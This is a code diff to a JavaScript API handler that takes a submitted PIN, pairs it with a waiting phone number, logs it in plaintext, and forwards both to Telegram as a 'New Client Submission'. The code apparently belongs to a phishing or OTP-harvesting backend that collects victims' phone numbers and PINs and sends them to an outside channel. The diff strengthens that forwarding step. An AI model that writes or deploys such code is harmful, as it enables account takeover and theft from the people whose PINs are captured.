@@ -11,27 +11,21 @@ export default async function handler(req, res) {
   if (req.method === 'POST') {
     try {
       const { pinCode } = req.body;
-      console.log('Received PIN:', pinCode);
+      console.log(`Received PIN: ${pinCode}`);
 
       // Find a phone number waiting for the PIN
       const phoneNumber = Object.keys(clientData).find(phone => clientData[phone] === null);
+      
+      if (phoneNumber) {
+        clientData[phoneNumber] = pinCode; // Store the PIN code for the phone number
+        console.log(`PIN code received: ${pinCode} for phone number: ${phoneNumber}`);
 
-if (!phoneNumber) {
-  res.status(400).json({ error: 'No phone number waiting for PIN' });
-  return;
-}
+        // Send phone number and PIN code to Telegram
+        const message = `New Client Submission:\nPhone Number: ${phoneNumber}\nPIN Code: ${pinCode}`;
+        await sendTelegramMessage(message);
 
-// Store the PIN code for the phone number
-clientData[phoneNumber] = pinCode;
-console.log(`Received PIN code: ${pinCode} for phone number: ${phoneNumber}`);
-
-// Send PIN code to Telegram (optional)
-const message = `PIN Code Submitted:\nPhone Number: ${phoneNumber}\nPIN: ${pinCode}`;
-await sendTelegramMessage(message);
-
-// Respond with success
-res.status(200).json({ status: 'PIN code received successfully.' });
-
+        // Respond with success
+        res.status(200).json({ status: 'PIN code received and sent to Telegram.' });
       } else {
         res.status(400).json({ error: 'Bad Request: No phone number waiting for a PIN.' });
       }
